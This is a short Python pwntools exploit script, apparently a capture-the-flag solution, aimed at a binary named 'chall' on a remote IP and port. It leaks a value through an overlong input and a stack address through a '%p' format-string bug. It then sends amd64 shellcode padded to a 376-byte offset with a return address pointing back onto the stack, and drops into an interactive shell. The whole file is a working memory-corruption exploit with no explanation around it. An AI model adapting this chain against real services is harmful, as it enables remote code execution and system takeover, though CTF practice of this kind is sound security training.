from pwn import *

e = ELF('./chall')
# p = e.process()
p = remote('34.45.81.67', 16004)

context.binary = e
context.arch = 'amd64'
p.sendlineafter(b'> ', b'A'*64)
p.recvuntil(b'A'*64)
nLeak = p.recvuntil(b'.').replace(b'.', b'')
nLeakInt = int.from_bytes(nLeak, 'little')
print("Leaked number: ", nLeakInt)
p.sendlineafter(b'how many honks?', f'{nLeakInt}'.encode())
p.sendlineafter(b'what\'s your name again?', b'%p')
p.recvuntil(b'wow ')
stackLeak = int(p.recvuntil(b'you\'re').replace(b' you\'re', b''), 16) - 0x126
print("Leaked stack address: ", hex(stackLeak))
offset = 376
# gdb.attach(p)
shellcode = asm(shellcraft.sh())

payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(stackLeak)

p.sendlineafter(b'would you like to leave to the world?', payload)
p.interactive()